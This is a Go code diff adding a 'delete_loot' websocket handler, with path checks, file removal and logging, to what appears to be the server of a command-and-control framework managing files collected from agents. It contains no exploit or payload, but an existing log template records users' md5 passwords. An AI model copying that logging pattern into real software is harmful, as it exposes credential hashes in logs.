@@ -1168,6 +1168,90 @@ func User_index(notFoundHeaders map[string]string) http.HandlerFunc {
 						return
 					}
 
+				case "delete_loot":
+					isSafePathPart := func(value string) bool {
+						value = strings.TrimSpace(value)
+						return value != "" &&
+							value != "." &&
+							value != ".." &&
+							filepath.VolumeName(value) == "" &&
+							filepath.Base(value) == value &&
+							!strings.ContainsAny(value, `/\`)
+					}
+					uid, ok := body["uid"].(string)
+					if !ok || !isSafePathPart(uid) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "invalid uid",
+						})
+						continue
+					}
+					username, ok := body["username"].(string)
+					if !ok || strings.TrimSpace(username) == "" {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "invalid username",
+						})
+						continue
+					}
+					fileName, ok := body["file"].(string)
+					if !ok || !isSafePathPart(fileName) {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "invalid file name",
+						})
+						continue
+					}
+					filePath := filepath.Join("uploads", uid, fileName)
+					info, err := os.Stat(filePath)
+					if err != nil {
+						if os.IsNotExist(err) {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    404,
+								"path":    "delete_loot",
+								"message": "file not found",
+								"uid":     uid,
+								"file":    fileName,
+							})
+						} else {
+							_ = clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "delete_loot",
+								"message": err.Error(),
+							})
+						}
+						continue
+					}
+					if info.IsDir() {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "delete_loot",
+							"message": "target is a directory",
+						})
+						continue
+					}
+					if err := os.Remove(filePath); err != nil {
+						_ = clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "delete_loot",
+							"message": "failed to delete file: " + err.Error(),
+						})
+						continue
+					}
+					_ = clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "delete_loot",
+						"message": "loot file deleted successfully",
+						"uid":     uid,
+						"file":    fileName,
+					})
+					logStr := fmt.Sprintf(log_word["del_loot"], username,fileName)
+					logger.WriteLog(logStr)
+					go PushAgentData(uid, "updateLoot")
+
 				case "download_loot":
 					uid, ok := body["uid"].(string)
 					if !ok || uid == "" {
@@ -6130,7 +6214,8 @@ func Read_log_word() {
         "chat_message":"[*] User: %s sent a chat: %s",
         "chat_file":"User: %s upload chat file: %s",
 		"user_join":"[*] User Join: from %s joined %s",
-		"add_user":"[*] User: %s added user: %s md5 password: %s"
+		"add_user":"[*] User: %s added user: %s md5 password: %s",
+		"del_loot":"[*] User: %s delete loot %s"
     }    
     `
 	// 检查文件是否存在
